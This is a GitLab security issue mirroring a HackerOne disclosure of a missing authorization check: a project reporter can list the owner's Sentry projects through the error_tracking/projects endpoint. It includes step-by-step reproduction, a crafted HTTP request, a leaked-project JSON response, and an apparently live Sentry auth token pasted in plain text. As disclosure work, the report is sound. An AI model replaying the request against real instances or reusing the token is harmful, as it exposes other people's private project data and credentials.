

[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# A project reporter can leak owner's Sentry instance projects

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #1947211](https://hackerone.com/reports/1947211)** by `js_noob` on 2023-04-14, assigned to [@dcouture](/dcouture "Dominic Couture"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

Hello team, as a part of the project error tracking a user (owner or maintainer) can connect Sentry to GitLab to track different project errors. This step allows the "owner" to connect to Sentry to fetch the available projects, this should only be available to "owners", this can be done by clicking the `Connect` button on Project Settings => Monitor => Error Tracking, checking the below screenshot. However, even a project reporter can fetch the connected Sentry instance projects.

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/a05ab3040581ba7b2ce09c733ca466fd2b89e905/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f37356662303839302d613131622d346466332d386264322d3262363662376537343663302f696d6167652e706e67)

##### Steps to reproduce

**As an owner:**

1. Create a new ultimate trial group, and create a new project in that group
2. Enable Sentry error tracking by going to <https://gitlab.com/GROUP/PROJECT/-/settings/operations> under Error tracking, you can use my Sentry instance, and choose any project in the drop-down:

   \* Sentry API URL: `https://xyz-6jv.sentry.io/`

   \* Auth Token: `a6d9c60bd9254c19995af8f0502b6d9aa2412dd92e724204a8b948e52b87dfc1`

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/be501fb2aad29be111a83d994964b915a817278c/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f34643865333231362d323962622d343364342d383363342d6430343333373936313736392f696d6167652e706e67)

3. Invite a reporter to the project/group

**As the reporter:**

4. Navigate to <https://gitlab.com/GROUP/PROJECT/-/settings/operations> and verify that you are blocked
5. Send the following request, to grab all the Sentry instance projects. Change the `api_host` if you used your own instance

```
GET /GROUP/PROJECT/-/error_tracking/projects?api_host=https://xyz-6jv.sentry.io/&token=* HTTP/2
Host: gitlab.com
Cookie: REDACTED
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Csrf-Token: REDACTED
X-Requested-With: XMLHttpRequest
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
```

6. The response should look similar to the one below, leaking all projects

```
{"projects":[{"id":"4505012306182144","name":"secret-project","status":"active","slug":"secret-project","organization_name":"XYZ","organization_id":"4505012227342336","organization_slug":"xyz-6jv"},{"id":"4505012228915200","name":"javascript","status":"active","slug":"javascript","organization_name":"XYZ","organization_id":"4505012227342336","organization_slug":"xyz-6jv"}]}
```

**NB:** I know that this exploitation requires knowing the sentry domain, there are a lot of ways that this can be done, a couple of examples if the reporter was a maintainer and was demoted or simply by brute force. However, the "real" bug/issue here is the missing authorization on `-/error_tracking/projects`

##### Video/POC

[bandicam\_2023-04-14\_14-56-04-252.mp4](https://user-content.gitlab-static.net/4ded65d2e75feecf94b2348f04d19487f8516298/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33393336656538652d383535332d343830372d613433362d6363323831613761623961622f62616e646963616d5f323032332d30342d31345f31342d35362d30342d3235322e6d7034 "Download 'bandicam_2023-04-14_14-56-04-252.mp4'")

#### Impact

A project reporter can leak the owner's Sentry instance projects by knowing the domain without auth token.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [image.png](https://h1.sec.gitlab.net/a/75fb0890-a11b-4df3-8bd2-2b66b7e746c0/image.png)
* [image.png](https://h1.sec.gitlab.net/a/4d8e3216-29bb-43d4-83c4-d04337961769/image.png)
* [bandicam\_2023-04-14\_14-56-04-252.mp4](https://h1.sec.gitlab.net/a/3936ee8e-8553-4807-a436-cc281a7ab9ab/bandicam_2023-04-14_14-56-04-252.mp4)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.

